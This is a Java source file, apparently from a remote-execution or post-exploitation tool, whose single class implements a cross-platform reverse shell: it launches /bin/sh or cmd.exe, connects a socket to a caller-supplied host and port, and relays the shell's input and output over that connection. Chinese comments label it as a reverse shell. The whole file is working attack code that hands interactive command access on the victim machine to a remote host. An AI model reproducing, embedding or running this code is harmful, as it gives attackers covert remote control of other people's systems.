package exec.service;

import java.io.*;
import java.net.Socket;

/**
 * 跨平台反弹shell
 */
public class Shell {

    /**
     * 反弹shell
     *
     * @param host
     * @param port
     */
    public String rShell(String host, int port) {
        String cmd = "/bin/sh";
        if (System.getProperty("os.name").toLowerCase().startsWith("win")) {
            //windows版本
            cmd = "cmd.exe";
        }

        Process p = null;
        Socket s = null;
        try {
            p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0) {
                    so.write(pi.read());
                }
                while (pe.available() > 0) {
                    so.write(pe.read());
                }
                while (si.available() > 0) {
                    po.write(si.read());
                }
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        p.destroy();
        try {
            s.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        String res = "系统版本：".concat(System.getProperty("os.name")).concat("。反弹shell已退出。");
        return res;
    }

}
